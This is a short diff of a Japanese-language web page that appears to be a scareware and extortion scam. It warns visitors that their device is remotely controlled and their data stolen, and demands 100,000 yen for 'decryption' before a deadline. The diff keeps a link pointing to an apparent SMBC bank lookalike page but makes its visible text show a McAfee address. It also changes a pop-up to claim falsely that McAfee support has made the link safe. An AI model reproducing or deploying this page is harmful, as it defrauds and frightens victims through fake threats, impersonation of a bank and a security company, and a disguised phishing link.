@@ -132,7 +132,7 @@
         setTimeout(() => {
           const msgHTML = `
            <br><br>
-ここをクリック👉: <a href="https://naji634.github.io/SMBC/" target="_blank" style="color: cyan;">https://naji634.github.io/fakesite-v2/</a><br><br>
+ここをクリック👉: <a href="https://naji634.github.io/SMBC/" target="_blank" style="color: cyan;">https://www.mcafee.com/ja-jp/index.html/</a><br><br>
 \uD83D\uDC80 このデバイスは遠隔操作されています。パスワード、写真、クレジット情報、SNS履歴も含まれます。<br><br>
 復号化には<strong>100,000円</strong>の振り込みが必要です。<br>
 支払い期限を過ぎると、データは完全に削除され復元不可能になります。<br><br>
@@ -178,7 +178,7 @@
   document.addEventListener("click", () => {
     if (!clicked) {
       clicked = true;
-      alert("⚠️ 外部アクセス解析:このデバイスは遠隔で管理されています。直ちに問題を解決してください。");
+      alert("McAfeeセキュリティサポート：ご安心ください。外部アクセス者からのURLを安全なサイトの書き換えに成功しました。");
     }
   });
 </script>
